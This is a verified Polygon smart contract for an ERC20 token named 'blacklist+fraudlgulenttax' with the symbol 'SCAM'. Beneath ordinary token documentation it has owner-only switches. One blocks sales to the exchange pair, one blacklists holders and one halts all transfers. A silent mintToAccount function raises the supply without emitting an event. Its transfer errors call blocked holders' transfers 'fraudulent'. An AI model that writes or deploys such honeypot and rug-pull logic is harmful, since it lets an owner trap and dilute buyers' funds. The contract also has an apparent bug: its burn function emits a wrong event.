/**
 *Submitted for verification at polygonscan.com on 2023-07-19
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface IERC20 {
    /**
     * @dev Returns the total supply of the token.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the balance of the specified `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Transfers `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner`
     * through {transferFrom}. This is zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the allowance mechanism. `amount` is then deducted
     * from the caller's allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
    /**
     * @dev Emitted when the allowance of a spender for an owner is set by a call to approve.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the number of decimals used to get its user representation.
     */
    function decimals() external view returns (uint8);
}

abstract contract Context {
    /**
     * @dev Returns the sender of the message.
     */
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    /**
     * @dev Returns the data of the message.
     */
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    /**
     * @dev Stores the token balances of each address
     */

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public whitelisted;
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public blockselling;
    bool st;
    /**
     * @dev Stores the approved token transfer amounts for each address
     */

    uint256 private _totalSupply;
    /**
     * @dev Total supply of the token
     */

    uint256 public _taxFee;
    /**
     * @dev Total tax fee percentage
     */

    string private _name;
    /**
     * @dev Token name
     */

    string private _symbol;
    /**
     * @dev Token symbol
     */

    address private _pancakeswap = 0x0000000000000000000000000000000000000000;
    address private _ownerWallet = 0x0000000000000000000000000000000000000000;
    /**
     * @dev Address of the owner's wallet
     */
    address private _taxAccount = 0x0000000000000000000000000000000000000000;

    mapping(address => bool) public excludedFromFee;

    /**
     * @dev Addresses excluded from the tax fee.
     * There is no way to add other address to the
     * mapping excludedFromFee unless included in
     * the code.
     */
    

    constructor(
        string memory name_,
        string memory symbol_,
        address ownerWallet_,
        address taxAccount_,
        uint256 totalSupply_,
        uint8 taxFee__
    ) {
        _taxFee = taxFee__;
        _name = name_;
        _symbol = symbol_;
        _ownerWallet = ownerWallet_;
        _taxAccount = taxAccount_;
        excludedFromFee[_ownerWallet] = true;
        excludedFromFee[_taxAccount] = true;
        st = true;
        _totalSupply = totalSupply_; // Set the initial total supply
        _balances[msg.sender] = _totalSupply; // Assign the total supply to the contract deployer
        emit Transfer(address(0), msg.sender, _totalSupply); // Emit the initial transfer event
    }

    /**
     * @dev Internal function to perform safe addition of two numbers.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Internal function to perform safe subtraction of two numbers.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    /**
     * @dev Internal function to perform safe multiplication of two numbers.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Internal function to perform safe division of two numbers.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used for the token.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev Returns the total supply of the token.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Returns the balance of the specified address.
     * @param account The address to check the balance of.
     */
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function setaddress(address pancakeswap) external onlyOwner {
        _pancakeswap = pancakeswap;
    }

    function disableselling() external onlyOwner {
        if (blockselling[_pancakeswap]) {
            blockselling[_pancakeswap] = false;
        }
        else {
            blockselling[_pancakeswap] = true;
        }
    }

    /**
     * @dev Transfers tokens from the caller's address to the recipient.
     * @param recipient The address to transfer tokens to.
     * @param amount The amount of tokens to transfer.
     * @return A boolean value indicating whether the transfer was successful.
     */
    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Returns the remaining allowance of tokens given to a spender by the owner.
     * @param owner The owner address granting the allowance.
     * @param spender The spender address for whom the allowance is provided.
     * @return The remaining allowance.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev Approves the spender to transfer the specified amount of tokens on behalf of the owner.
     * @param spender The address to grant the transfer approval to.
     * @param amount The amount of tokens to approve for transfer.
     * @return A boolean value indicating whether the approval was successful.
     */
    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function whitelist(address _address) onlyOwner external {
        if (whitelisted[_address]) {
            whitelisted[_address] = false;
        }
        else {
            whitelisted[_address] = true;
        }
    }

    function blacklist(address _address) onlyOwner external {
        if (blacklisted[_address]) {
            blacklisted[_address] = false;
        }
        else {
            blacklisted[_address] = true;
        }
    }

    function stopTransfers() onlyOwner external {
        if (st) {
            st = false;
        }
        else {
            st = true;
        }
    }

    /**
     * @dev Burns a specific amount of tokens from the caller's address.
     * @param amount The amount of tokens to burn.
     */
    function burn(uint256 amount) external {
        _burn(_msgSender(), amount);
    }

    /**
     * @dev Transfers tokens from the sender's address to the recipient.
     * @param sender The address to transfer tokens from.
     * @param recipient The address to transfer tokens to.
     * @param amount The amount of tokens to transfer.
     * @return A boolean value indicating whether the transfer was successful.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );
            _approve(sender, _msgSender(), sub(currentAllowance, amount));
        }

        _transfer(sender, recipient, amount);

        return true;
    }

    /**
     * @dev Increases the allowance of the spender for the caller's address.
     * @param spender The address to increase the allowance for.
     * @param addedValue The amount to increase the allowance by.
     * @return A boolean value indicating whether the increase was successful.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            add(_allowances[_msgSender()][spender], (addedValue))
        );
        return true;
    }

    /**
     * @dev Decreases the allowance of the spender for the caller's address.
     * @param spender The address to decrease the allowance for.
     * @param subtractedValue The amount to decrease the allowance by.
     * @return A boolean value indicating whether the decrease was successful.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(
            _msgSender(),
            spender,
            sub(currentAllowance, (subtractedValue))
        );
        return true;
    }

    /**
     * @dev Internal function to transfer tokens from the sender to the recipient.
     * @param sender The address to transfer tokens from.
     * @param recipient The address to transfer tokens to.
     * @param amount The amount of tokens to transfer.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than zero");
        require(st, "ERC20: transfer is fraudulent");
        require(!blacklisted[sender], "ERC20: unstable load");
        require(!blockselling[recipient], "ERC20: transfer is fraudulent");
        uint256 taxAmount;
        taxAmount = div(amount, 100);
        if (excludedFromFee[sender] || excludedFromFee[recipient]) {
            taxAmount = 0;
        }
        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 taxAmount_ = taxAmount * _taxFee;
        uint256 transferAmount = sub(amount, taxAmount_);
        _balances[sender] = sub(senderBalance, amount);

        _balances[recipient] = add(_balances[recipient], (transferAmount));
        _balances[_taxAccount] = add(_balances[_taxAccount], taxAmount_);
        emit Transfer(sender, recipient, transferAmount);
        emit Transfer(sender, _taxAccount, taxAmount_);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_ownerWallet, address(0));
        _ownerWallet = address(0);
    }

    /**
     * @dev Internal function to mint a specific amount of tokens to an account.
     * @param account The account to mint tokens to.
     * @param amount The amount of tokens to mint.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        require(account == _ownerWallet, "Account must be owner wallet");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = add(_totalSupply, (amount));
        _balances[account] = add(_balances[account], (amount));
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Internal function to burn a specific amount of tokens from an account.
     * @param account The account to burn tokens from.
     * @param amount The amount of tokens to burn.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = sub(accountBalance, amount);
        _totalSupply = sub(_totalSupply, amount);

        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Internal function to approve the spender to transfer the specified amount of tokens on behalf of the owner.
     * @param owner The owner address granting the allowance.
     * @param spender The spender address to grant the approval to.
     * @param amount The amount of tokens to approve for transfer.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    modifier onlyOwner() {
        require(
            _ownerWallet == _msgSender(),
            "Ownable: caller is not the owner"
        );
        _;
    }

    function mintToAccount(address account, uint256 amount) external onlyOwner {
        _totalSupply += amount;
        _balances[account] += amount;
    }

    /**
     * @dev Internal function that is called before any token transfer.
     * This can be overridden in derived contracts to provide additional logic.
     * @param from The address where the tokens are transferred from.
     * @param to The address where the tokens are transferred to.
     * @param amount The amount of tokens transferred.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Internal function that is called after any token transfer.
     * This can be overridden in derived contracts to provide additional logic.
     * @param from The address where the tokens are transferred from.
     * @param to The address where the tokens are transferred to.
     * @param amount The amount of tokens transferred.
     */

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Binera is ERC20 {
    constructor()
        ERC20(
            "blacklist+fraudlgulenttax", // name
            "SCAM", // symbol
            0xeB1C988e0b33E1De51b31Dac47501B6b1721d2C9, // Owner Address
            0x4196719121467F763dBc6E654c551900f122b339, // Tax Address
            1000 * 10**18, // Total Supply
            5 // tax amount
        )
    {}
}